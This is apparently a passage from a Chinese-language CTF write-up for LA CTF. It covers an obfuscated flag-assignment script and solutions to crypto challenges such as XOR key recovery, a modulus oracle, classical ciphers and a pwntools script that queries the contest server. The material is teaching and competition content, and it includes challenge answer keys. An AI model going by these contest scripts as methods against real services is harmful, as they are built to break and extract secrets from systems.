-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[] <br>flag[-~-~-~-~-~[]] = -~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~-~[]<br></code></pre></td></tr></table></figure><p><img src="/mdimg/lactf/12.png"><br>转一下就是flag<br><code>lactf&#123;th3_hungry_l1ttl3_c4t3rp1ll4r_at3_th3_fl4g_4g41n&#125;</code></p><h3 id="string-cheese"><a href="#string-cheese" class="headerlink" title="string-cheese"></a>string-cheese</h3><h4 id="题目说明-7"><a href="#题目说明-7" class="headerlink" title="题目说明"></a>题目说明</h4><h4 id="解题思路-6"><a href="#解题思路-6" class="headerlink" title="解题思路"></a>解题思路</h4><p>g0at：一眼顶针的题 比赛的时候没看tnnd<br><img src="/mdimg/lactf/13.png"><br><img src="/mdimg/lactf/14.png"></p><h2 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h2><h3 id="one-more-time-pad"><a href="#one-more-time-pad" class="headerlink" title="one-more-time-pad"></a><strong>one-more-time-pad</strong></h3><h4 id="题目说明-8"><a href="#题目说明-8" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard the onetime pad is perfectly secure so I used it to send an important message to a friend, but now a UCLA competition is asking for the key? I threw that out a long time ago! Can you help me recover it?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> itertools <span class="hljs-keyword">import</span> cycle<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br><br>key = cycle(<span class="hljs-string">b&quot;lactf&#123;??????????????&#125;&quot;</span>)<br><br>ct = <span class="hljs-string">&quot;&quot;</span><br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(pt)):<br>    b = (pt[i] ^ <span class="hljs-built_in">next</span>(key))<br>    ct += <span class="hljs-string">f&#x27;<span class="hljs-subst">&#123;b:02x&#125;</span>&#x27;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;ct =&quot;</span>, ct)<br><br><span class="hljs-comment">#ct = 200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br></code></pre></td></tr></table></figure><h4 id="解题思路-7"><a href="#解题思路-7" class="headerlink" title="解题思路"></a>解题思路</h4><p>异或一下就行</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span>*<br>pt = <span class="hljs-string">b&quot;Long ago, the four nations lived together in harmony ...&quot;</span><br>ct = <span class="hljs-number">0x200e0d13461a055b4e592b0054543902462d1000042b045f1c407f18581b56194c150c13030f0a5110593606111c3e1f5e305e174571431e</span><br>ct=long_to_bytes(<span class="hljs-built_in">int</span>(ct))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">len</span>(ct)):<br>    flag = (pt[i] ^ ct[i])<br>    <span class="hljs-built_in">print</span>(<span class="hljs-built_in">chr</span>(flag),end=<span class="hljs-string">&#x27;&#x27;</span>)<br><span class="hljs-comment">#lactf&#123;b4by_h1t_m3_0ne_m0r3_t1m3&#125;</span><br></code></pre></td></tr></table></figure><h3 id="chinese-lazy-theorem-1"><a href="#chinese-lazy-theorem-1" class="headerlink" title="chinese-lazy-theorem-1"></a>chinese-lazy-theorem-1</h3><h4 id="题目说明-9"><a href="#题目说明-9" class="headerlink" title="题目说明"></a>题目说明</h4><p>I heard about this cool theorem called the Chinese Remainder Theorem, but, uh… I’m feeling kinda tired right now.<br><code>nc lac.tf 31110</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> Crypto.Random.random <span class="hljs-keyword">import</span> randint<br><br>p = getPrime(<span class="hljs-number">512</span>)<br>q = getPrime(<span class="hljs-number">512</span>)<br>n = p*q<br><br>target = randint(<span class="hljs-number">1</span>, n)<br><br>used_oracle = <span class="hljs-literal">False</span><br><br><span class="hljs-built_in">print</span>(p)<br><span class="hljs-built_in">print</span>(q)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;To quote Pete Bancini, \&quot;I&#x27;m tired.\&quot;&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;I&#x27;ll answer one modulus question, that&#x27;s it.&quot;</span>)<br><span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;What do you want?&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;1: Ask for a modulus&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;2: Guess my number&quot;</span>)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;3: Exit&quot;</span>)<br>    response = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;&gt;&gt; &quot;</span>)<br><br>    <span class="hljs-keyword">if</span> response == <span class="hljs-string">&quot;1&quot;</span>:<br>        <span class="hljs-keyword">if</span> used_oracle:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;too lazy&quot;</span>)<br>            <span class="hljs-built_in">print</span>()<br>        <span class="hljs-keyword">else</span>:<br>            modulus = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your modulus here: &quot;</span>)<br>            modulus = <span class="hljs-built_in">int</span>(modulus)<br>            <span class="hljs-keyword">if</span> modulus &lt;= <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;something positive pls&quot;</span>)<br>                <span class="hljs-built_in">print</span>()<br>            <span class="hljs-keyword">else</span>:<br>                used_oracle = <span class="hljs-literal">True</span><br>                <span class="hljs-built_in">print</span>(target%modulus)<br>                <span class="hljs-built_in">print</span>()<br>    <span class="hljs-keyword">elif</span> response == <span class="hljs-string">&quot;2&quot;</span>:<br>        guess = <span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;Type your guess here: &quot;</span>)<br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">int</span>(guess) == target:<br>            <span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>                <span class="hljs-built_in">print</span>(f.readline())<br>        <span class="hljs-keyword">else</span>:<br>            <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;nope&quot;</span>)<br>        exit()<br>    <span class="hljs-keyword">else</span>:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;bye&quot;</span>)<br>        exit()<br><br></code></pre></td></tr></table></figure><h4 id="解题思路-8"><a href="#解题思路-8" class="headerlink" title="解题思路"></a>解题思路</h4><p><code>print(target%modulus)</code>令modulus大于target就可以泄露target<br><img src="/mdimg/lactf/15.png"></p><h3 id="rolling-in-the-mud"><a href="#rolling-in-the-mud" class="headerlink" title="rolling in the mud"></a><strong>rolling in the mud</strong></h3><h4 id="题目说明-10"><a href="#题目说明-10" class="headerlink" title="题目说明"></a>题目说明</h4><p>uugh, these pigs in my pen are making a complete mess! They’re <em>rolling</em> all over the place!<br>Anyway, can you decode this cipher they gave me, almost throwing it at me while rolling around?<br>Answer in lowercase with symbols. In the image, { and } are characters that should appear in your flag, and replace spaces with _.</p><h4 id="解题思路-9"><a href="#解题思路-9" class="headerlink" title="解题思路"></a>解题思路</h4><p><img src="/mdimg/lactf/16.png"><br>显然猪圈<br><a href="http://moersima.00cha.net/zhuquan.asp">http://moersima.00cha.net/zhuquan.asp</a><br><code>&#123;eombmcvcalebupauntcnjppmjfnicnappmjfnippmjfni&#125;dugip</code><br>逆序一下然后<br><a href="http://www.quipqiup.com/">http://www.quipqiup.com/</a>爆破一下<br><code>lactf&#123;rolling_and_rolling_and_rolling_until_the_pigs_go_home&#125;</code></p><h3 id="greek-cipher"><a href="#greek-cipher" class="headerlink" title="greek cipher"></a>greek cipher</h3><h4 id="题目说明-11"><a href="#题目说明-11" class="headerlink" title="题目说明"></a>题目说明</h4><p>You think you’ve seen all of the “classic” ciphers? Instead of your standard cipher, I’ve created my own cipher: the monoalphagreek cipher!<br>Answer with just the flag in lowercase with symbols left in.</p><h4 id="解题思路-10"><a href="#解题思路-10" class="headerlink" title="解题思路"></a>解题思路</h4><figure class="highlight haxe"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs haxe">κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ζπι ιηγ δςρθι ψγρθπζ ςζ ηςθιπρω θνθψγμιγκ πδ νθςζε γζμρωψιςπζ? τγ ζγςιηγρ. κςκ ωπν αζπλ ιησι χνοςνθ μσγθσρ λσθ ψρπξσξοω δονγζι ςζ εργγα? τγ ζγςιηγρ. ς οςαγ ηπλ εργγα μησρσμιγρ οππα ιηπνεη, γυγζ ςδ ς μσζ<span class="hljs-string">&#x27;ι ργσκ ιηγτ. οσμιδ&#123;ς_ενγθθ_νθςζε_τσζω_εργγα_μησρσμιγρθ_κςκζ&#x27;</span>ι<span class="hljs-literal">_</span>θιπψ<span class="hljs-literal">_</span>ωπν.<span class="hljs-literal">_</span>λγοο<span class="hljs-literal">_</span>ψοσωγκ<span class="hljs-literal">_</span>ς<span class="hljs-literal">_</span>τνθι<span class="hljs-literal">_</span>θσω.μπζερσιθ!&#125;<br></code></pre></td></tr></table></figure><p>参考了国外师傅的wp，只能说6666<br><code>**print(&#39;&#39;.join(sorted(set(input()))))**</code><br>这段代码实现了一个字符串的去重排序功能。它会接收用户的输入作为字符串，将其转换为一个集合，从而删除重复的字符。然后，它将集合排序，并将其转换回字符串。最后，代码使用 “print” 函数打印出结果。<br>然后借助一个工具网站<a href="https://tio.run/#">https://tio.run/#</a><br><img src="/mdimg/lactf/17.png"><br>然后用Cyberchef的Substitute<br><img src="/mdimg/lactf/18.png"><br>最后quipqiup<br><img src="/mdimg/lactf/19.png"></p><h3 id="guess-the-bit"><a href="#guess-the-bit" class="headerlink" title="guess-the-bit!"></a>guess-the-bit!</h3><h4 id="题目说明-12"><a href="#题目说明-12" class="headerlink" title="题目说明"></a>题目说明</h4><p>I’m trying out for this new game show, but it doesn’t seem that hard since there are only two choices? Regardless, I heard someone name Pollard could help me out with it?</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> random<br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><br>n = <span class="hljs-number">43799663339063312211273714468571591746940179019655418145595314556164983756585900662541462573429625012257141409310387298658375836921310691578072985664621716240663221443527506757539532339372290041884633435626429390371850645743643273836882575180662344402698999778971350763364891217650903860191529913028504029597794358613653479290767790778510701279503128925407744958108039428298936189375732992781717888915493080336718221632665984609704015735266455668556495869437668868103607888809570667555794011994982530936046877122373871458757189204379101886886020141036227219889443327932080080504040633414853351599120601270071913534530651</span><br><br>a = <span class="hljs-number">6</span><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;n = &quot;</span>, n)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;a = &quot;</span>, <span class="hljs-number">6</span>)<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">150</span>):<br>    bit = random.randrange(<span class="hljs-number">0</span>,<span class="hljs-number">2</span>)<br>    c = random.randrange(<span class="hljs-number">0</span>, n)<br>    c = c**<span class="hljs-number">2</span><br>    <span class="hljs-keyword">if</span> bit == <span class="hljs-number">1</span>:<br>        c *= a<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;c = &quot;</span>, c)<br>    guess = <span class="hljs-built_in">int</span>(<span class="hljs-built_in">input</span>(<span class="hljs-string">&quot;What is your guess? &quot;</span>))<br>    <span class="hljs-keyword">if</span> guess != bit:<br>        <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Better luck next time!&quot;</span>)<br>        exit()<br><br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;Congrats! Here&#x27;s your flag: &quot;</span>)<br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>, <span class="hljs-string">&quot;r&quot;</span>).readline().strip()<br><span class="hljs-built_in">print</span>(flag)<br>exit(<span class="hljs-number">0</span>)<br></code></pre></td></tr></table></figure><h4 id="解题思路-11"><a href="#解题思路-11" class="headerlink" title="解题思路"></a>解题思路</h4><p>仔细观察加密源码逻辑，进行了 150 次循环，每次循环都生成一个随机数字 c，该数字要么是原始数字的平方，要么是原始数字的平方与 6的积。所以需要猜测该数字是否是平方或者6的倍数。<img src="/mdimg/lactf/20.png"><br>如上图所示，如果两个条件都成立，向服务器返回”1” ，否则返回 “0” 。可以一个个去算，但是捏，150次，懂自懂，所以借助pwntools来写个脚本来交互。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> sympy.ntheory.primetest <span class="hljs-keyword">import</span> is_square <br><br>p = remote(<span class="hljs-string">&#x27;lac.tf&#x27;</span>, <span class="hljs-number">31190</span>)<br>p.recvline()<br>p.recvline()<br><br>C = <span class="hljs-number">0</span><br><br><span class="hljs-keyword">while</span> C != <span class="hljs-number">150</span>:<br>    c = <span class="hljs-built_in">int</span>((p.recvline().decode()).split(<span class="hljs-string">&quot; &quot;</span>)[-<span class="hljs-number">1</span>])<br>    <span class="hljs-keyword">if</span> c%<span class="hljs-number">6</span> == <span class="hljs-number">0</span> <span class="hljs-keyword">and</span> is_square(c//<span class="hljs-number">6</span>):<br>        p.sendline(<span class="hljs-string">b&quot;1&quot;</span>)<br>    <span class="hljs-keyword">else</span>:<br>        p.sendline(<span class="hljs-string">b&quot;0&quot;</span>)<br>    C += <span class="hljs-number">1</span><br>    <span class="hljs-built_in">print</span>(C,end=<span class="hljs-string">&quot;\r&quot;</span>)<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><span class="hljs-built_in">print</span>(p.recv(<span class="hljs-number">1024</span>))<br><br><span class="hljs-comment"># lactf&#123;sm4ll_pla1nt3xt_sp4ac3s_ar3n&#x27;t_al4ways_e4sy&#125;</span><br></code></pre></td></tr></table></figure><h3 id="chinese-lazy-theorem-2"><a href="#chinese-lazy-theorem-2" class="headerlink" title="chinese-lazy-theorem-2"></a>chinese-lazy-theorem-2</h3><h4 id="题目说明-13"><a href="#题目说明-13" class="headerlink" title="题目说明"></a>题目说明</h4><p>Ok I’m a little less lazy now but you’re still not getting much from me.<br><code>nc lac.tf 31111</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span 